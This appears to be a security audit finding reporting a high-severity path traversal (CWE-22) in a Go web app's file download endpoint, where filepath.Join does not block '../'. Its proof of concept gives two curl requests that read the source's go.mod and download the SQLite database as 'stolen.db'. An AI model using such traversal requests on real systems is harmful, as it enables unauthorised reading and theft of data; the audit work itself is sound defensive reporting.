# H7 — Path Traversal in `GET /api/files?name=` (V13)

**Severity:** High  
**CWE:** CWE-22 | **OWASP:** A01:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-013-v13-path-traversal.md`

## Summary

`filepath.Join("./uploads", name)` does not block `../` traversal. Unauthenticated read of any file the process can access.

## PoC

```bash
# Read source
curl "http://localhost:4443/api/files?name=../../go.mod"
# Read SQLite DB
curl "http://localhost:4443/api/files?name=../../restaurant.db" -o stolen.db
```
